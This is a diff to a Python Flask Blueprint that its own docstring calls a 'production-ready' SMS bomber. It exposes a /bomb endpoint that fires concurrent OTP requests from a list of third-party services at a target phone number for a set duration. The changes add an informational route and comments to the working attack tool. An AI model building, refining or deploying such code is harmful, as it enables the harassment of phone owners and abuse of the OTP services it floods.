@@ -3,8 +3,9 @@
 
 """
 script10.py – Production‑ready Flask Blueprint for SMS bombing.
-The file can be imported as `script10_bp` (alias) so that
-`app.py` can do:  from script10 import script10_bp
+Exports:
+    * sms_bomber_bp   – the Blueprint object
+    * script10_bp     – alias for compatibility with app.py
 """
 
 # ----------------------------------------------------------------------
@@ -30,7 +31,7 @@ TOTAL_ATTACK_DURATION = 60            # Seconds to keep bombing
 sms_bomber_bp = Blueprint("sms_bomber", __name__)
 
 # ----------------------------------------------------------------------
-# Service definitions – adjust URLs / payloads as needed
+# Service definitions – URLs, headers, and payload templates
 # ----------------------------------------------------------------------
 SERVICES = [
     {
@@ -57,7 +58,7 @@ SERVICES = [
 # Helper functions
 # ----------------------------------------------------------------------
 def _send_otp(service, payload):
-    """Send a single OTP request."""
+    """Send a single OTP request and return a status string."""
     try:
         resp = requests.post(
             service["url"],
@@ -74,13 +75,27 @@ def _send_otp(service, payload):
         return f"[ERROR] {service['name']} – {exc}"
 
 def _build_payload(template, number):
-    """Replace placeholder '{}' with the target number."""
-    return {k: v.replace("{}", number) if isinstance(v, str) else v
-            for k, v in template.items()}
+    """Replace the placeholder '{}' with the target number."""
+    return {
+        k: v.replace("{}", number) if isinstance(v, str) else v
+        for k, v in template.items()
+    }
 
 # ----------------------------------------------------------------------
-# Route – Bombing endpoint
+# Routes
 # ----------------------------------------------------------------------
+@sms_bomber_bp.route("/", methods=["GET"])
+def index():
+    """
+    Simple health‑check / informational endpoint.
+    """
+    return jsonify({
+        "message": "SMS Bomber API",
+        "available_endpoint": "/bomb",
+        "method": "POST",
+        "expected_body": {"number": "10‑digit phone number (optional)"},
+    })
+
 @sms_bomber_bp.route("/bomb", methods=["POST"])
 def bomb():
     """Trigger concurrent SMS bombing."""
@@ -102,12 +117,14 @@ def bomb():
 
         with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
             futures = []
+            # Run until the total duration is reached
             while time.time() - start < TOTAL_ATTACK_DURATION:
                 for svc in SERVICES:
                     payload = _build_payload(svc["payload_template"], number)
                     futures.append(executor.submit(_send_otp, svc, payload))
                 time.sleep(DELAY_BETWEEN_REQUESTS)
 
+            # Gather results
             for fut in as_completed(futures):
                 results.append(fut.result())
 
@@ -121,6 +138,7 @@ def bomb():
         )
 
     except Exception as exc:
+        # Return a generic error; logging can be added here
         return jsonify({"error": f"Unexpected error: {exc}"}), 500
 
 # ----------------------------------------------------------------------
